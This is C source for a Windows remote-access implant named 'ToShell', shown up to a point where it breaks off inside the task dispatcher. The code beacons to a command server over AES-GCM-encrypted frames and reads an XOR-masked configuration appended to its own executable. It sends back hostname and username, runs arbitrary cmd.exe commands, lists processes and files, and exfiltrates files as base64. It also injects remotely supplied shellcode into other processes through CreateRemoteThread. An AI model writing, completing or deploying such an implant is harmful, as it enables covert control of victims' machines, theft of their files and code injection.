// ToShell C implant — minimal Windows TCP beacon (32/64-bit, mingw-w64)
// Protocol-compatible with ToShell Go implant (TSHL frames + AES-GCM).
//
// Frame layout (wire):
//   [4B BE len][1B type][AES-GCM(compress(TSHL packet))]
//     type 0x00 = control (AES-GCM, payload = gzip?(packet))
//     type 0x01 = raw tunnel (SM4-CTR, not used here)
// TSHL packet header (30B): "TSHL" + version(1) + type(1) + len(4) + id(8) + ts(8) + csum(4)
//
// This implant supports: register / heartbeat / command / file_list.
// Build: x86_64-w64-mingw32-gcc or i686-w64-mingw32-gcc:
//   gcc -Os -s -ffunction-sections -fdata-sections -Wl,--gc-sections -o implant.exe main.c -lws2_32 -lbcrypt -ladvapi32
//
// Config block: server appends "TOSHELL_CFG_V1:" XOR-masked JSON at file tail.
//   <xor("TOSHELL_CFG_V1:")> <4B BE len, XOR-masked> <JSON, XOR-masked>
// XOR key = {0x5A, 0xC3, 0x2D, 0x9F}, key stream starts at block offset.

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

// ─── defaults (overridden by config block) ───
static char g_server[256]   = "{{SERVER_URL}}";
static char g_encKeyB64[64] = "{{ENCRYPTION_KEY}}";
static int  g_interval      = {{INTERVAL}};
static int  g_retryWait     = {{RETRY_WAIT}};

// ─── TSHL protocol constants ───
#define TSHL_MAGIC0 'T'
#define TSHL_MAGIC1 'S'
#define TSHL_MAGIC2 'H'
#define TSHL_MAGIC3 'L'
#define TSHL_VERSION 0x01
#define TSHL_HDRSZ   30
#define TSHL_MAXPAY  10*1024*1024

#define TYPE_REGISTER   0x00
#define TYPE_HEARTBEAT  0x01
#define TYPE_TASK       0x02
#define TYPE_RESULT     0x03
#define TYPE_FILEUPLOAD 0x04
#define TYPE_FILEDOWN   0x05
#define TYPE_ACK        0x06
#define TYPE_SHELLOPEN  0x07
#define TYPE_SHELLDATA  0x08
#define TYPE_SHELLCLOSE 0x09
#define TYPE_TUNNEL     0x0A
#define TYPE_RELAY      0x0B

#define FRAME_CTRL 0x00
#define FRAME_RAW  0x01

// ─── config block ───
#define CFG_MAGIC "TOSHELL_CFG_V1:"
static const unsigned char g_xorKey[4] = {0x5A, 0xC3, 0x2D, 0x9F};

static unsigned char xor_magic[16];
static int xor_magic_len = 0;

static unsigned char g_key[32];      // AES-256 key (decoded from g_encKeyB64)
static int g_keyLen = 0;
static unsigned __int64 g_sessionID = 0;

// ─── tiny helpers ───
static void hexdump_skip(void) {}

static void xor_block_at(unsigned char *dst, const unsigned char *src, int len, int startOff) {
    int i;
    for (i = 0; i < len; i++) {
        dst[i] = src[i] ^ g_xorKey[(startOff + i) % 4];
    }
}

// base64 decode (no padding validation, len output)
static int b64decode(const char *in, unsigned char *out, int outMax) {
    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int val = 0, bits = 0, n = 0;
    const char *p;
    for (p = in; *p && n < outMax; p++) {
        const char *c = strchr(tbl, *p);
        if (!c) continue;
        val = (val << 6) | (int)(c - tbl);
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            out[n++] = (unsigned char)((val >> bits) & 0xFF);
        }
    }
    return n;
}

// find substring in file tail; returns offset or -1
static long find_cfg_magic(const unsigned char *data, long size) {
    long i;
    if (size < xor_magic_len + 4) return -1;
    for (i = size - xor_magic_len; i >= 0; i--) {
        if (memcmp(data + i, xor_magic, xor_magic_len) == 0) return i;
    }
    return -1;
}

// parse JSON string value for given key: {"key":"value"} or {"key":123}
static int json_get_string(const char *json, const char *key, char *out, int outSz) {
    char pat[128];
    const char *p, *end;
    snprintf(pat, sizeof(pat), "\"%s\":\"", key);
    p = strstr(json, pat);
    if (!p) return 0;
    p += strlen(pat);
    end = strchr(p, '"');
    if (!end) return 0;
    if ((int)(end - p) >= outSz) return 0;
    memcpy(out, p, end - p);
    out[end - p] = 0;
    return 1;
}

static int json_get_int(const char *json, const char *key, int *out) {
    char pat[128];
    const char *p;
    snprintf(pat, sizeof(pat), "\"%s\":", key);
    p = strstr(json, pat);
    if (!p) return 0;
    p += strlen(pat);
    *out = atoi(p);
    return 1;
}

// ─── config block loading ───
static void load_config(void) {
    char path[MAX_PATH];
    HANDLE h;
    DWORD sz, rd;
    unsigned char *buf;
    long magicOff;
    unsigned char lenBuf[4], json[4096];
    unsigned int jsonLen;
    char server[256] = {0}, encKey[64] = {0}, transport[16] = {0};
    int iv = 0, rw = 0;

    // precompute XOR-masked magic
    xor_magic_len = (int)strlen(CFG_MAGIC);
    xor_block_at(xor_magic, (const unsigned char *)CFG_MAGIC, xor_magic_len, 0);

    GetModuleFileNameA(NULL, path, sizeof(path));
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    sz = GetFileSize(h, NULL);
    if (sz < xor_magic_len + 4 + 32) { CloseHandle(h); return; }
    buf = (unsigned char *)malloc(sz);
    if (!buf) { CloseHandle(h); return; }
    rd = 0;
    if (!ReadFile(h, buf, sz, &rd, NULL) || rd != sz) { free(buf); CloseHandle(h); return; }
    CloseHandle(h);

    magicOff = find_cfg_magic(buf, (long)sz);
    if (magicOff < 0) { free(buf); return; }

    // length field at magicOff + xor_magic_len, key stream offset = xor_magic_len
    xor_block_at(lenBuf, buf + magicOff + xor_magic_len, 4, xor_magic_len);
    jsonLen = ((unsigned int)lenBuf[0] << 24) | ((unsigned int)lenBuf[1] << 16) |
              ((unsigned int)lenBuf[2] << 8) | (unsigned int)lenBuf[3];
    if (jsonLen == 0 || jsonLen > sizeof(json)) { free(buf); return; }
    // JSON at +4 more, key stream offset = xor_magic_len + 4
    xor_block_at(json, buf + magicOff + xor_magic_len + 4, (int)jsonLen, xor_magic_len + 4);
    json[jsonLen] = 0;
    free(buf);

    if (json_get_string((char *)json, "server_url", server, sizeof(server))) {
        snprintf(g_server, sizeof(g_server), "%s", server);
    }
    if (json_get_string((char *)json, "encryption_key", encKey, sizeof(encKey)) && encKey[0]) {
        snprintf(g_encKeyB64, sizeof(g_encKeyB64), "%s", encKey);
    }
    if (json_get_int((char *)json, "interval", &iv) && iv > 0) g_interval = iv;
    if (json_get_int((char *)json, "retry_wait", &rw) && rw > 0) g_retryWait = rw;
    (void)transport;
}

// ─── AES-GCM (bcrypt) ───
static BCRYPT_ALG_HANDLE g_alg = NULL;
static BCRYPT_KEY_HANDLE g_hKey = NULL;

static int aes_gcm_init(void) {
    NTSTATUS st;
    if (g_keyLen == 0) {
        g_keyLen = b64decode(g_encKeyB64, g_key, sizeof(g_key));
        if (g_keyLen == 0) {
            // fallback: use the literal string bytes (dev without config block)
            int l = (int)strlen(g_encKeyB64);
            memcpy(g_key, g_encKeyB64, l > 32 ? 32 : l);
            g_keyLen = l > 32 ? 32 : l;
        }
    }
    st = BCryptOpenAlgorithmProvider(&g_alg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (st != 0) return 0;
    st = BCryptSetProperty(g_alg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (st != 0) return 0;
    st = BCryptGenerateSymmetricKey(g_alg, &g_hKey, NULL, 0, g_key, (ULONG)g_keyLen, 0);
    if (st != 0) return 0;
    return 1;
}

// encrypt: out = nonce(12) || ct || tag(16); returns total len or 0
static int aes_gcm_encrypt(const unsigned char *pt, int ptLen, unsigned char *out) {
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    unsigned char nonce[12];
    NTSTATUS st;
    ULONG cbNeeded = 0, cbDone = 0;
    int i;
    for (i = 0; i < 12; i++) nonce[i] = (unsigned char)(rand() & 0xFF);
    memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info);
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    info.pbNonce = nonce;
    info.cbNonce = 12;
    info.pbTag = out + 12 + ptLen;
    info.cbTag = 16;

    // GCM 两遍调用：第一遍拿所需长度（含 tag 空间），第二遍实际加密。
    // 注意：第二遍 cbOutput 必须 >= ptLen+16（密文+tag），否则 STATUS_INVALID_PARAMETER。
    st = BCryptEncrypt(g_hKey, (PUCHAR)pt, (ULONG)ptLen, &info, NULL, 0,
        NULL, 0, &cbNeeded, 0);
    if (st != 0) return 0;
    memcpy(out, nonce, 12);
    st = BCryptEncrypt(g_hKey, (PUCHAR)pt, (ULONG)ptLen, &info, NULL, 0,
        out + 12, cbNeeded + 16, &cbDone, 0);
    if (st != 0 || cbDone != (ULONG)ptLen) return 0;
    return 12 + ptLen + 16;
}

// decrypt: in = nonce(12) || ct || tag(16); returns plaintext len or -1
static int aes_gcm_decrypt(const unsigned char *in, int inLen, unsigned char *out) {
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    NTSTATUS st;
    ULONG cbNeeded = 0, cbDone = 0;
    if (inLen < 12 + 16) return -1;
    memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info);
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    info.pbNonce = (PUCHAR)in;
    info.cbNonce = 12;
    info.pbTag = (PUCHAR)(in + inLen - 16);
    info.cbTag = 16;
    st = BCryptDecrypt(g_hKey, (PUCHAR)(in + 12), (ULONG)(inLen - 12 - 16), &info,
        NULL, 0, NULL, 0, &cbNeeded, 0);
    if (st != 0 || cbNeeded != (ULONG)(inLen - 12 - 16)) return -1;
    st = BCryptDecrypt(g_hKey, (PUCHAR)(in + 12), (ULONG)(inLen - 12 - 16), &info,
        NULL, 0, out, cbNeeded, &cbDone, 0);
    if (st != 0) return -1;
    return (int)cbDone;
}

// ─── TSHL packet encode/decode ───
typedef struct {
    unsigned char magic[4];
    unsigned char version;
    unsigned char type;
    unsigned int  length;   // payload length (network order in wire)
    unsigned __int64 id;
    unsigned __int64 ts;
    unsigned int  csum;
    unsigned char *payload;
    int payloadLen;
} TSHLPacket;

static void pkt_init(TSHLPacket *p, unsigned char type, unsigned __int64 id) {
    memset(p, 0, sizeof(*p));
    p->magic[0] = TSHL_MAGIC0; p->magic[1] = TSHL_MAGIC1;
    p->magic[2] = TSHL_MAGIC2; p->magic[3] = TSHL_MAGIC3;
    p->version = TSHL_VERSION;
    p->type = type;
    p->id = id;
    p->ts = (unsigned __int64)GetTickCount64();
}

// wire packet = 30B header + payload
static int pkt_wire(const TSHLPacket *p, unsigned char *out) {
    int i;
    unsigned int len = (unsigned int)(p->payload ? p->payloadLen : 0);
    unsigned int beLen = ((len & 0xFF) << 24) | ((len & 0xFF00) << 8) | ((len >> 8) & 0xFF00) | ((len >> 24) & 0xFF);
    unsigned int beIdHi, beIdLo, beTsHi, beTsLo;
    out[0] = TSHL_MAGIC0; out[1] = TSHL_MAGIC1; out[2] = TSHL_MAGIC2; out[3] = TSHL_MAGIC3;
    out[4] = TSHL_VERSION;
    out[5] = p->type;
    out[6] = (unsigned char)(len >> 24); out[7] = (unsigned char)(len >> 16);
    out[8] = (unsigned char)(len >> 8);  out[9] = (unsigned char)len;
    beIdHi = (unsigned int)(p->id >> 32); beIdLo = (unsigned int)(p->id & 0xFFFFFFFF);
    beTsHi = (unsigned int)(p->ts >> 32); beTsLo = (unsigned int)(p->ts & 0xFFFFFFFF);
    out[10] = (unsigned char)(beIdHi >> 24); out[11] = (unsigned char)(beIdHi >> 16);
    out[12] = (unsigned char)(beIdHi >> 8);  out[13] = (unsigned char)beIdHi;
    out[14] = (unsigned char)(beIdLo >> 24); out[15] = (unsigned char)(beIdLo >> 16);
    out[16] = (unsigned char)(beIdLo >> 8);  out[17] = (unsigned char)beIdLo;
    out[18] = (unsigned char)(beTsHi >> 24); out[19] = (unsigned char)(beTsHi >> 16);
    out[20] = (unsigned char)(beTsHi >> 8);  out[21] = (unsigned char)beTsHi;
    out[22] = (unsigned char)(beTsLo >> 24); out[23] = (unsigned char)(beTsLo >> 16);
    out[24] = (unsigned char)(beTsLo >> 8);  out[25] = (unsigned char)beTsLo;
    for (i = 0; i < 4; i++) out[26 + i] = 0; // checksum (unused)
    if (p->payload && p->payloadLen > 0) memcpy(out + TSHL_HDRSZ, p->payload, p->payloadLen);
    return TSHL_HDRSZ + (p->payload ? p->payloadLen : 0);
}

// parse TSHL packet from wire bytes; returns header len or -1
static int pkt_parse(const unsigned char *in, int inLen, TSHLPacket *p) {
    if (inLen < TSHL_HDRSZ) return -1;
    if (in[0] != TSHL_MAGIC0 || in[1] != TSHL_MAGIC1 || in[2] != TSHL_MAGIC2 || in[3] != TSHL_MAGIC3) return -1;
    p->version = in[4];
    p->type = in[5];
    p->length = ((unsigned int)in[6] << 24) | ((unsigned int)in[7] << 16) |
                ((unsigned int)in[8] << 8) | (unsigned int)in[9];
    p->id = ((unsigned __int64)in[10] << 56) | ((unsigned __int64)in[11] << 48) |
            ((unsigned __int64)in[12] << 40) | ((unsigned __int64)in[13] << 32) |
            ((unsigned __int64)in[14] << 24) | ((unsigned __int64)in[15] << 16) |
            ((unsigned __int64)in[16] << 8) | (unsigned __int64)in[17];
    p->ts = ((unsigned __int64)in[18] << 56) | ((unsigned __int64)in[19] << 48) |
            ((unsigned __int64)in[20] << 40) | ((unsigned __int64)in[21] << 32) |
            ((unsigned __int64)in[22] << 24) | ((unsigned __int64)in[23] << 16) |
            ((unsigned __int64)in[24] << 8) | (unsigned __int64)in[25];
    p->payloadLen = (int)p->length;
    if (TSHL_HDRSZ + p->payloadLen > inLen) return -1;
    p->payload = (unsigned char *)(in + TSHL_HDRSZ);
    return TSHL_HDRSZ + p->payloadLen;
}

// ─── send frame: [4B len][1B type][encrypted packet] ───
static SOCKET g_sock = INVALID_SOCKET;

// 发送缓冲：承载大结果帧（tasklist/file_list 可达数十 KB）。
// 用动态分配而非 static 大数组：static 数组会进 BSS/数据段使 PE 体积膨胀。
#define SEND_BUF_SIZE (256 * 1024)

static int send_frame(SOCKET s, const TSHLPacket *pkt) {
    unsigned char *wire, *enc, *frame;
    int wireLen, encLen, frameLen;
    unsigned char hdr[5];
    int i;

    wire = (unsigned char *)malloc(SEND_BUF_SIZE);
    enc = (unsigned char *)malloc(SEND_BUF_SIZE + 32);
    frame = (unsigned char *)malloc(SEND_BUF_SIZE + 64);
    if (!wire || !enc || !frame) {
        if (wire) free(wire);
        if (enc) free(enc);
        if (frame) free(frame);
        return 0;
    }

    wireLen = pkt_wire(pkt, wire);
    if (wireLen <= 0) { free(wire); free(enc); free(frame); return 0; }
    if (wireLen + 32 >= SEND_BUF_SIZE) { free(wire); free(enc); free(frame); return 0; } // 超限丢弃
    encLen = aes_gcm_encrypt(wire, wireLen, enc);
    if (encLen <= 0) { free(wire); free(enc); free(frame); return 0; }

    hdr[0] = (unsigned char)(encLen >> 24); hdr[1] = (unsigned char)(encLen >> 16);
    hdr[2] = (unsigned char)(encLen >> 8);  hdr[3] = (unsigned char)encLen;
    hdr[4] = FRAME_CTRL;

    memcpy(frame, hdr, 5);
    memcpy(frame + 5, enc, encLen);
    frameLen = 5 + encLen;

    for (i = 0; i < frameLen; ) {
        int n = send(s, (const char *)frame + i, frameLen - i, 0);
        if (n <= 0) { free(wire); free(enc); free(frame); return 0; }
        i += n;
    }
    free(wire); free(enc); free(frame);
    return 1;
}

// ─── recv frame (blocking with timeout) ───
// 返回：>0 加密载荷长度；-2 超时（无数据）；-1 连接错误/断开。
static int recv_frame(SOCKET s, unsigned char *enc, int encMax, int timeoutMs) {
    unsigned char hdr[5];
    int got = 0, n;
    unsigned int len;
    struct timeval tv;
    fd_set fds;
    while (got < 5) {
        FD_ZERO(&fds); FD_SET(s, &fds);
        if (timeoutMs > 0) {
            tv.tv_sec = timeoutMs / 1000;
            tv.tv_usec = (timeoutMs % 1000) * 1000;
            if (select(0, &fds, NULL, NULL, &tv) == 0) return -2;
        }
        n = recv(s, (char *)hdr + got, 5 - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    len = ((unsigned int)hdr[0] << 24) | ((unsigned int)hdr[1] << 16) |
          ((unsigned int)hdr[2] << 8) | (unsigned int)hdr[3];
    if (hdr[4] != FRAME_CTRL || len == 0 || len > (unsigned int)encMax) return -1;
    got = 0;
    while (got < (int)len) {
        FD_ZERO(&fds); FD_SET(s, &fds);
        if (timeoutMs > 0) {
            tv.tv_sec = timeoutMs / 1000;
            tv.tv_usec = (timeoutMs % 1000) * 1000;
            if (select(0, &fds, NULL, NULL, &tv) == 0) return -2;
        }
        n = recv(s, (char *)enc + got, len - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return (int)len;
}

// ─── JSON string escape ───
static void json_escape(const char *in, char *out, int outSz) {
    int o = 0;
    while (*in && o < outSz - 2) {
        if (*in == '"' || *in == '\\') {
            if (o < outSz - 3) { out[o++] = '\\'; out[o++] = *in; }
        } else if (*in < 0x20) {
            if (o < outSz - 3) { out[o++] = ' '; }
        } else {
            out[o++] = *in;
        }
        in++;
    }
    out[o] = 0;
}

// ─── system info ───
static void get_hostname(char *out, int sz) {
    DWORD n = sz;
    if (!GetComputerNameA(out, &n)) snprintf(out, sz, "unknown");
}
static void get_username(char *out, int sz) {
    DWORD n = sz;
    if (!GetUserNameA(out, &n)) snprintf(out, sz, "unknown");
}
static DWORD get_pid(void) { return GetCurrentProcessId(); }
static void get_procname(char *out, int sz) {
    char path[MAX_PATH];
    char *p;
    GetModuleFileNameA(NULL, path, sizeof(path));
    p = strrchr(path, '\\');
    snprintf(out, sz, "%s", p ? p + 1 : path);
}

// ─── register packet ───
static int build_register(char *buf, int bufSz) {
    char hn[128], un[128], pn[128];
    int n;
    get_hostname(hn, sizeof(hn));
    get_username(un, sizeof(un));
    get_procname(pn, sizeof(pn));
    n = snprintf(buf, bufSz,
        "{\"Hostname\":\"%s\",\"Username\":\"%s\",\"OS\":\"Windows\",\"Arch\":\"x86\","
        "\"PID\":%lu,\"ProcessName\":\"%s\",\"ProcessPath\":\"\",\"IPAddresses\":[],"
        "\"MACAddresses\":[],\"Domain\":\"\"}",
        hn, un, get_pid(), pn);
    return n;
}

// ─── execute command via cmd /c, capture output ───
// gbk_to_utf8: Windows 命令输出为系统代码页（中文系统=GBK/CP936），
// 前端/服务端按 UTF-8 处理，需要转换。用 MultiByteToWideChar + WideCharToMultiByte。
// 非 GBK 编码（UTF-8 输出）会保持原样：先尝试按 UTF-8 解码失败才按 GBK 转。
static void gbk_to_utf8(const char *in, char *out, int outSz) {
    int wlen, ulen;
    wchar_t *wide;
    if (outSz <= 1) { out[0] = 0; return; }

    // 第一遍：多字节 → UTF-16（CP_ACP = 当前系统代码页，中文系统即 GBK）
    wlen = MultiByteToWideChar(CP_ACP, 0, in, -1, NULL, 0);
    if (wlen <= 0) { snprintf(out, outSz, "%s", in); return; }
    wide = (wchar_t *)malloc((size_t)wlen * sizeof(wchar_t));
    if (!wide) { snprintf(out, outSz, "%s", in); return; }
    MultiByteToWideChar(CP_ACP, 0, in, -1, wide, wlen);

    // 第二遍：UTF-16 → UTF-8
    ulen = WideCharToMultiByte(CP_UTF8, 0, wide, -1, NULL, 0, NULL, NULL);
    if (ulen <= 0 || ulen > outSz) {
        free(wide);
        snprintf(out, outSz, "%s", in);
        return;
    }
    WideCharToMultiByte(CP_UTF8, 0, wide, -1, out, ulen, NULL, NULL);
    free(wide);
}

static int run_command(const char *cmd, char *out, int outSz) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hOutR = NULL, hOutW = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmdline[4096];
    DWORD readTotal = 0, avail = 0, rd = 0;
    int exitCode = -1;

    if (outSz <= 1) return -1;
    out[0] = 0;

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hOutR, &hOutW, &sa, 0)) return -1;
    SetHandleInformation(hOutR, HANDLE_FLAG_INHERIT, 0);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hOutW;
    si.hStdError = hOutW;
    si.dwFlags = STARTF_USESTDHANDLES;
    memset(&pi, 0, sizeof(pi));

    // CreateProcessA 的第一个参数传 NULL 时，第二参数必须是完整命令行
    // （可执行文件路径 + 参数），"/c echo ..." 无法直接解析，必须带 cmd.exe。
    // 用绝对路径：植入端可能运行在精简 PATH 环境，相对名找不到 cmd.exe。
    snprintf(cmdline, sizeof(cmdline), "C:\\Windows\\System32\\cmd.exe /c %s", cmd);

    if (CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                       NULL, NULL, &si, &pi)) {
        CloseHandle(hOutW);
        // 读输出直到进程退出且管道排空（有界）
        DWORD totalWait = 0;
        while (readTotal < (DWORD)outSz - 1) {
            // 先排空当前可用数据
            for (;;) {
                if (PeekNamedPipe(hOutR, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                    if (!ReadFile(hOutR, out + readTotal, outSz - 1 - readTotal, &rd, NULL)) break;
                    readTotal += rd;
                } else {
                    break;
                }
            }
            DWORD wr = WaitForSingleObject(pi.hProcess, 200);
            if (wr == WAIT_OBJECT_0) {
                // 进程已退出：最后再排空一次管道
                while (readTotal < (DWORD)outSz - 1 &&
                       PeekNamedPipe(hOutR, NULL, 0, NULL, &avail, NULL) && avail > 0) {
                    if (!ReadFile(hOutR, out + readTotal, outSz - 1 - readTotal, &rd, NULL)) break;
                    readTotal += rd;
                }
                break;
            }
            totalWait += 200;
            if (totalWait > 60000) break; // 60s 上限
        }
        out[readTotal] = 0;
        // 命令输出转 UTF-8（中文系统 cmd 输出为 GBK）
        {
            char *tmp = (char *)malloc(outSz);
            if (tmp) {
                memcpy(tmp, out, outSz);
                gbk_to_utf8(tmp, out, outSz);
                free(tmp);
            }
        }
        WaitForSingleObject(pi.hProcess, 5000);
        GetExitCodeProcess(pi.hProcess, (LPDWORD)&exitCode);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        CloseHandle(hOutW);
    }
    CloseHandle(hOutR);
    return exitCode;
}

// ─── list files (dir-style, minimal) ───
static int run_file_list(const char *path, char *out, int outSz) {
    char cmd[512];
    if (!path || !*path) path = "C:\\";
    snprintf(cmd, sizeof(cmd), "dir /b \"%s\"", path);
    return run_command(cmd, out, outSz);
}

// ─── process list (tasklist CSV) ───
static int run_process_list(char *out, int outSz) {
    // tasklist /fo csv /nh：无表头精简输出，PN, PID, SessName, Sess#, MemUsage
    // 输出会含 GBK 中文（映像名称列），C 端为控制体积不做 GBK→UTF-8 转换，
    // 属已知限制（Go 植入端有转换）。
    return run_command("tasklist /fo csv /nh", out, outSz);
}

// ─── file download（base64 单帧回传，≤128KB）───────────────────────
// 大文件（>128KB）在 C 端精简实现中不适用；Go 植入端有分块直传。
// 返回 base64 编码的文件内容（服务端落库 output 字段），由服务端还原。
static int run_file_download(const char *path, unsigned __int64 taskID, char *out, int outSz) {
    HANDLE h;
    DWORD sz, rd = 0;
    unsigned char *buf;
    char *b64;
    if (!path || !*path) { snprintf(out, outSz, "no path"); return -1; }
    h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { snprintf(out, outSz, "open failed: %lu", GetLastError()); return -1; }
    sz = GetFileSize(h, NULL);
    if (sz > 96 * 1024) { // 限制 96KB 以内（base64 后 ~128KB）
        CloseHandle(h);
        snprintf(out, outSz, "file too large for C implant (%lu bytes); use Go implant for >96KB", sz);
        return -1;
    }
    buf = (unsigned char *)malloc(sz + 1);
    if (!buf) { CloseHandle(h); return -1; }
    ReadFile(h, buf, sz, &rd, NULL);
    CloseHandle(h);
    buf[rd] = 0;
    // base64 编码到 out
    b64 = (char *)malloc((sz / 3 + 2) * 4 + 4);
    if (!b64) { free(buf); return -1; }
    {
        static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        int i, o = 0;
        for (i = 0; i + 2 < (int)rd; i += 3) {
            unsigned v = (buf[i] << 16) | (buf[i+1] << 8) | buf[i+2];
            b64[o++] = tbl[(v >> 18) & 63];
            b64[o++] = tbl[(v >> 12) & 63];
            b64[o++] = tbl[(v >> 6) & 63];
            b64[o++] = tbl[v & 63];
        }
        if (i < (int)rd) {
            unsigned v = buf[i] << 16;
            b64[o++] = tbl[(v >> 18) & 63];
            if (i + 1 < (int)rd) { v |= buf[i+1] << 8; b64[o++] = tbl[(v >> 12) & 63]; b64[o++] = tbl[(v >> 6) & 63]; b64[o++] = '='; }
            else { b64[o++] = '='; b64[o++] = '='; }
        }
        b64[o] = 0;
    }
    if ((int)strlen(b64) < outSz) {
        snprintf(out, outSz, "%s", b64);
    } else {
        snprintf(out, outSz, "b64 too large");
        free(b64); free(buf);
        return -1;
    }
    free(b64);
    free(buf);
    return 0;
}

// ─── process inject（CreateRemoteThread，基础版）───────────────────
// 任务 Data: {"method":"...","pid":N,"shellcode":"<base64>"}
// 流程：OpenProcess → VirtualAllocEx(RWX) → WriteProcessMemory → CreateRemoteThread
static int run_process_inject(const char *dataJson, char *out, int outSz) {
    const char *p;
    unsigned long pid = 0;
    char b64[65536] = {0};
    unsigned char sc[49152];
    int scLen = 0;
    HANDLE hProc = NULL, hThread = NULL;
    void *remote = NULL;
    DWORD tid = 0;

    // 解析 pid
    p = strstr(dataJson, "\"pid\":");
    if (p) pid = strtoul(p + 6, NULL, 10);
    // 解析 shellcode base64（可能含转义引号）
    p = strstr(dataJson, "\"shellcode\":\"");
    if (p) {
        const char *s = p + 13;
        int o = 0;
        while (*s && *s != '"' && o < (int)sizeof(b64) - 1) {
            if (*s == '\\' && s[1] == '"') { b64[o++] = '"'; s += 2; }
            else if (*s == '\\' && s[1] == '\\') { b64[o++] = '\\'; s += 2; }
            else b64[o++] = *s++;
        }
        b64[o] = 0;
    }
    if (pid == 0 || b64[0] == 0) {
        snprintf(out, outSz, "inject requires pid + shellcode");
        return -1;
    }
    scLen = b64decode(b64, sc, sizeof(sc));
    if (scLen <= 0) {
        snprintf(out, outSz, "shellcode decode failed");
        return -1;
    }

    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProc) {
        snprintf(out, outSz, "OpenProcess(%lu) failed: %lu", pid, GetLastError());
        return -1;
    }
    remote = VirtualAllocEx(hProc, NULL, scLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        snprintf(out, outSz, "VirtualAllocEx failed: %lu", GetLastError());
        CloseHandle(hProc);
        return -1;
    }
    if (!WriteProcessMemory(hProc, remote, sc, scLen, NULL)) {
        snprintf(out, outSz, "WriteProcessMemory failed: %lu", GetLastError());
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -1;
    }
    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, &tid);
    if (!hThread) {
        snprintf(out, outSz, "CreateRemoteThread failed: %lu", GetLastError());
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return -1;
    }
    CloseHandle(hThread);
    CloseHandle(hProc);
    snprintf(out, outSz, "injected %d bytes into pid %lu (tid=%lu)", scLen, pid, tid);
    return 0;
}

// ─── task dispatch ───
static void handle_task(const unsigned char *payload, int payloadLen) {
    char json[96 * 1024];
    char type[64] = {0}, cmd[2048] = {0};
    unsigned __int64 taskID = 0;
    // 输出缓冲：tasklist/file_list 结果可达数十 KB；动态分配避免 PE 体积膨胀
    char *resultJson, *output, *outEsc;
    TSHLPacket pkt;
    int exitCode = -1;

    resultJson = (char *)malloc(128 * 1024);
    output = (char *)malloc(128 * 1024);
    outEsc = (char *)malloc(160 * 1024);
    if (!resultJson || !output || !outEsc) {
        if (resultJson) free(resultJson);
        if (output) free(output);
        if (outEsc) free(outEsc);
        return;
    }

    if (payloadLen >= (int)sizeof(json)) { free(resultJson); free(output); free(outEsc); return; }
    memcpy(json, payload, payloadLen);
    json[payloadLen] = 0;

    json_get_string(json, "TaskType", type, sizeof(type));
    json_get_string(json, "Command", cmd, sizeof(cmd));
    {
        char pathBuf[1024] = {0};
        json_get_string(json, "Path", pathBuf, sizeof(pathBuf));
        snprintf(cmd, sizeof(cmd), "%s", pathBuf[0] ? pathBuf : cmd);
    }
    // task ID may appear as {"ID":123} (Go json field) or {"id":..}
    {
        const char *p = strstr(json, "\"ID\":");
        if (p) taskID = strtoull(p + 5, NULL, 10);
    }
    (void)taskID;

    output[0] = 0;
    if (strcmp(type, "command") == 0) {
        exitCode = run_command(cmd, output, 128 * 1024);
    } else if (strcmp(type, "file_list") == 0) {
        exitCode = run_file_list(cmd, output, 128 * 1024);
    } else if (strcmp(type, "process_list") == 0) {
        exitCode = run_process_list(output, 128 * 1024);
    } else if (strcmp(type, "file_download") == 0) {
        exitCode = run_file_download(cmd, taskID, output, 128 * 1024);
    } else if (strcmp(type, "process_inject") == 0) {
        // 注入 Data 在 task.Data 字段（JSON 含 pid/shellcode）
        char dataBuf[70000] = {0};
        json_get_string(json, "Data", dataBuf, sizeof(dataBuf));
        if (dataBuf[0] == 0) { snprintf(output, 128*1024, "no inject data"); exitCode = -1; }
